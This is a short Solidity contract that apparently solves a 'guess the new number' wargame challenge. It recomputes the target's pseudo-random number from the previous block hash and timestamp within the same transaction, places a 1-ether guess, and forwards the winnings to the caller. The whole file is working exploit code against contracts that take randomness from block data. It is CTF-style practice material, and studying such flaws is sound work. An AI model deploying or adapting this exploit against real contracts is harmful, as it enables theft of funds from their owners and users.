pragma solidity ^0.8.0;

interface IGuessTheNewNumber {

    function guess(uint8 n) external payable;

}

contract GuessTheNewNumberAttack {

    function attack(address challenge) external payable {
        require(msg.value >= 1 ether, "Insufficient amount");
        uint8 number = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        IGuessTheNewNumber(challenge).guess{value: 1 ether}(number);
        
        payable(msg.sender).transfer(address(this).balance);
    }

receive() external payable{}
}